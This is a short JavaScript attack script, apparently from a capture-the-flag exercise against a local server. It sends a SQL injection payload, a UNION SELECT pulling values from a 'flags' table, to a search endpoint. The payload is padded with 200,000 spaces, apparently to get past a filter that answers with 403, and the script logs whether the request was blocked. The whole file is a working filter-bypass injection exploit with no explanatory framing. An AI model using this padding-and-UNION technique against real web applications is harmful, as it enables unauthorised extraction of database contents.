const bypassSearch = async (payload) => {
    const res = await fetch(`http://localhost:4000/api/search?q=${encodeURIComponent(payload)}`);
    if (res.status !== 403) {
      console.log(`[SUCCESS SEARCH] Status: ${res.status}`);
      const text = await res.text();
      console.log(`Response: ${text.substring(0, 100)}...\n`);
    } else {
        console.log(`[BLOCKED SEARCH]`);
    }
};

const run = async () => {
    const padding = " ".repeat(200000);
    await bypassSearch(`%' ${padding} UNION SELECT id, flag_value FROM flags--`);
};

run();
